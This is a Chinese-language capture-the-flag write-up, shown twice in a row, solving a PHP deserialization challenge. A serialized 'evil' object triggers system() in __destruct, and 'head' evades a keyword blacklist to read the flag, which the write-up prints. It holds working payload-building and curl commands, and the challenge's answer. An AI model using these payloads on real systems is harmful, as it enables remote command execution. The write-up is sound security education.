---
# [NewStarCTF 2023 公开赛道]Unserialize?

## Summary

PHP反序列化漏洞利用，构造恶意序列化对象触发`__destruct`执行系统命令，绕过`cat|tac|more|tail|base`黑名单读取flag文件。

## Solution

### Step 1: 分析源码

题目源码直接通过`highlight_file`展示：

```php
class evil {
    private $cmd;
    public function __destruct() {
        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
            @system($this->cmd);
        }
    }
}
@unserialize($_POST['unser']);
```

关键点：
- `private $cmd` 属性需要特殊序列化格式（`\x00evil\x00cmd`）
- `__destruct` 在对象销毁时自动调用，执行 `system($this->cmd)`
- 黑名单过滤 `cat|tac|more|tail|base`，可用 `head`/`nl`/`sort` 等绕过

### Step 2: 构造Payload并执行

```bash
# 生成序列化Payload
php -r '
class evil {
    private $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
}
# 先列目录找flag位置
echo urlencode(serialize(new evil("ls /")));
'

# 发送请求发现flag文件: th1s_1s_fffflllll4444aaaggggg
curl -s -X POST "http://TARGET/" \
  -d "unser=O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D"

# 用head绕过黑名单读取flag
php -r '
class evil {
    private $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
}
echo urlencode(serialize(new evil("head /th1s_1s_fffflllll4444aaaggggg")));
' | xargs -I {} curl -s -X POST "http://TARGET/" -d "unser={}"
```

输出：
```
flag{b545249c-6632-4f21-ae42-8bf3cce99ee5}
```

## Flag

```
flag{b545249c-6632-4f21-ae42-8bf3cce99ee5}
```---
title: "[NewStarCTF 2023 公开赛道]Unserialize?"
ctf: "NewStarCTF 2023"
date: 2026-05-25
category: web
difficulty: easy
flag_format: "flag{...}"
---

# [NewStarCTF 2023 公开赛道]Unserialize?

## Summary

PHP反序列化漏洞利用，构造恶意序列化对象触发`__destruct`执行系统命令，绕过`cat|tac|more|tail|base`黑名单读取flag文件。

## Solution

### Step 1: 分析源码

题目源码直接通过`highlight_file`展示：

```php
class evil {
    private $cmd;
    public function __destruct() {
        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
            @system($this->cmd);
        }
    }
}
@unserialize($_POST['unser']);
```

关键点：
- `private $cmd` 属性需要特殊序列化格式（`\x00evil\x00cmd`）
- `__destruct` 在对象销毁时自动调用，执行 `system($this->cmd)`
- 黑名单过滤 `cat|tac|more|tail|base`，可用 `head`/`nl`/`sort` 等绕过

### Step 2: 构造Payload并执行

```bash
# 生成序列化Payload
php -r '
class evil {
    private $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
}
# 先列目录找flag位置
echo urlencode(serialize(new evil("ls /")));
'

# 发送请求发现flag文件: th1s_1s_fffflllll4444aaaggggg
curl -s -X POST "http://TARGET/" \
  -d "unser=O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D"

# 用head绕过黑名单读取flag
php -r '
class evil {
    private $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
}
echo urlencode(serialize(new evil("head /th1s_1s_fffflllll4444aaaggggg")));
' | xargs -I {} curl -s -X POST "http://TARGET/" -d "unser={}"
```

输出：
```
flag{b545249c-6632-4f21-ae42-8bf3cce99ee5}
```

## Flag

```
flag{b545249c-6632-4f21-ae42-8bf3cce99ee5}
```